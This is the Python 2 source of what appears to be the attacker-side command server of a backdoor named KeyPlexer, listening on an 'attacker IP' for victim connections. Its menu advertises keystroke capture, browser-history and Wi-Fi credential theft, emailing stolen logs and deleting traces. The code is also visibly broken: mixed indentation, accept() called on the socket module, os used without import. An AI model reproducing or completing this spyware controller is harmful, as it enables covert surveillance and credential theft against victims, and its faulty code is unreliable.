#!/usr/bin/python

import subprocess 
import socket
import time
import sys

""" This module for creating quick backdoors
    servers
    TODO The backdoor uses username and password for protection purposes
    """

def banner():
  print  """
            Name:
            Date :
            Version : v2.0
             _  __             ____   _                        
            | |/ / ___  _   _ |  _ \ | |  ___ __  __ ___  _ __ 
            | ' / / _ \| | | || |_) || | / _ \\ \/ // _ \| '__|
            | . \|  __/| |_| ||  __/ | ||  __/ >  <|  __/| |   
            |_|\_\\___| \__, ||_|    |_| \___|/_/\_\\___||_|   
                        |___/
                        
                      ooo,    .---.
                     o`  o   /    |\________________
                    o`   'oooo()  | ________   _   _)
                    `oo   o` \    |/        | | | |
                      `ooo'   `---'         "-" |_|
            """

host = '10.0.0.54' # Attacker IP address
port = 443 # Port number in which the attacker server listen to


def menu():

  """This function shows the server options"""
  
  print "[*] Server Options: "
  print
  print "[*] refresh        ========= > Refresh the connection" #DONE
  print "[*] list           ========= > Lists all the connected clients" #DONE

  
def interact():

  """This function to show the client interaction menu"""
  
  print "[*] Client options: "
  print 
  print "[*] Keylog         ========= > Start capturing keystrokes" #DONE
  print "[*] Openwins       ========= > Get all the open program windows on the machine" #DONE
  print "[*] Capture        ========= > take images of the host machine " #TODO
  print "[*] Sendlogs       ========= > Sending logs and images by email" #DONE
  print "[*] History        ========= > Gathers all browsers history" #DONE
  print "[*] Wifi           ========= > Get Wi-Fi credentials " #DONE
  print "[*] Status         ========= > Get the status of the machine on/off" #TODO
  print "[*] SystemInfo     ========= > Get Fingerprint of the system" #TODO
  print "[*] IP             ========= > Get the external IP address" #DONE
  print "[*] Cover          ========= > Delete all traces of logs" #TODO
  print "\n\n"
  
  

# create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# bind socket to the host address and port number
sock.bind((host,port))

# set timeout for the connection
sock.settimeout(5)

# define the maximun number of connection
sock.listen(10)


all_connections = []  # holds the connections
all_addresses   = []  # holds the IP addresses




def get_multiple_clients():
    """This function handles multiple client"""
    for one_conn in all_connections:

        # make sure to close all the connection first to avoid issues
        one_conn.close()

    # empty the list, delete all connections before start listening
    del all_connections [:]
    del all_addresses [:]


    # Begin the process of accepting clients
    while True:
        
        try :
            client_conn, addr = socket.accept()
            
            client_conn.setblocking(1)

            all_connections.append(client_conn)
            all_addresses.append(addr)


        except:
             #print "[+] ERROR: Cheeck the connection "
             break
            
    
def backdoor_shell():

      banner()
      menu()
      
      # run while loop to initiate the resverse connection
      while True:

           command = raw_input(">shell >>")
           print 
           if (command == "accept"):
                get_multiple_clients()
                print "[INFO] Done Accepting\n"
                
           elif(command == "list"):
                print "--------\nClients:\n--------"
                for item in all_addresses:
                    print "%d - %s|%s" % (all_addresses.index(item) + 1, str(item[0]), str(item[1]))
                print "\n"
         
          elif (command == "select"):
                 pass
                
          # shell command to be executed
          #user_command = raw_input("$Meterpreter_shell: >>> ")

          elif (command == "clear"):
            
                # clears the screen
                os.system("cls")

          elif (command == "help"):

              # help menus
              menu()
              interact()
              
          elif (command == ":kill"):

              print "[+] Disconnecting from form the victim machine ----------------"
              break
              

              
def main():

      	backdoor_shell()


	


main()
